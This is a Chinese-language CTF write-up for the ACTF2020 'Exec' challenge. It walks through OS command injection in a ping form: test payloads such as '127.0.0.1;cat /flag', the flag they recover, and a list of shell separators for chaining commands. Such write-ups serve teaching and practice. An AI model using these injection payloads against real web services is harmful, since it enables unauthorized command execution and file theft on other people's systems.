# [ACTF2020 新生赛]Exec

## 题目概述
题目提供了一个简单的 PING 功能页面，用户可以输入 IP 地址进行 ping 测试。页面标题 "command execution" 暗示了命令执行漏洞。

## 信息收集
1. 访问页面，发现是一个 ping 功能的表单
2. 表单通过 POST 方法提交，参数名为 `target`
3. 页面标题 "command execution" 提示可能存在命令执行漏洞

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：OS 命令注入

**原理**：后端代码将用户输入的 `target` 参数直接拼接到 shell 命令中执行，如 `ping -c 3 $target`，未对特殊字符进行过滤。

**判断过程**：
- 输入 `127.0.0.1;ls` 测试，发现分号后的 `ls` 命令被执行，输出了 `index.php`
- 确认存在命令注入漏洞，可以使用 `;`、`|`、`&&` 等符号拼接任意命令

## 利用过程（Payload + Flag）

**Payload 1**：测试命令注入
```
target=127.0.0.1;ls
```
结果：确认漏洞存在，列出当前目录文件 `index.php`

**Payload 2**：查找 flag 文件
```
target=127.0.0.1;ls -la /
```
结果：发现根目录下有 `/flag` 文件

**Payload 3**：读取 flag
```
target=127.0.0.1;cat /flag
```
结果：`flag{b9e22805-b7b0-4ea1-a89f-ce6eaf975b96}`

## 复现步骤
1. 访问题目 URL
2. 在输入框中输入 `127.0.0.1;cat /flag`
3. 点击 PING 按钮
4. 页面返回 ping 结果和 flag 内容

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| OS命令注入 | target 参数 | `127.0.0.1;cat /flag` | 分号命令分隔符、命令拼接 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
- 看到 ping、nslookup 等网络工具功能，优先测试命令注入
- 常用测试符号：`;`、`|`、`||`、`&&`、`&`、换行符
- 命令注入后先找 flag 位置：`find / -name "*flag*"` 或 `ls -la /`

**同类题型套路**：
1. 识别可执行系统命令的功能点（ping、转换、压缩等）
2. 测试命令分隔符：`;`、`|`、`&&`、`||`
3. 执行命令查找并读取 flag
